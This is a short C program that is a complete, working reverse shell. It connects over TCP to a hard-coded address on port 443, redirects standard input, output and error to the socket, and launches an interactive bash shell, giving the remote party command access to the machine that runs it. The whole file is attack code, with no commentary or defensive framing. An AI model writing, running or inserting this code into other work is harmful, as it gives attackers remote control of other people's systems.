#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(int argc, char const *argv[])
{
    int port = 443;
    char ip[] = "192.168.1.26";
    
    int socketfd;
    struct sockaddr_in revsockaddr;

    socketfd = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(ip);

    connect(socketfd, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(socketfd, 0);dup2(socketfd, 1);dup2(socketfd, 2);

    char * const args[] = {"/bin/bash", "-i", NULL};
    execve("/bin/bash", args, NULL);

    return 0;
}
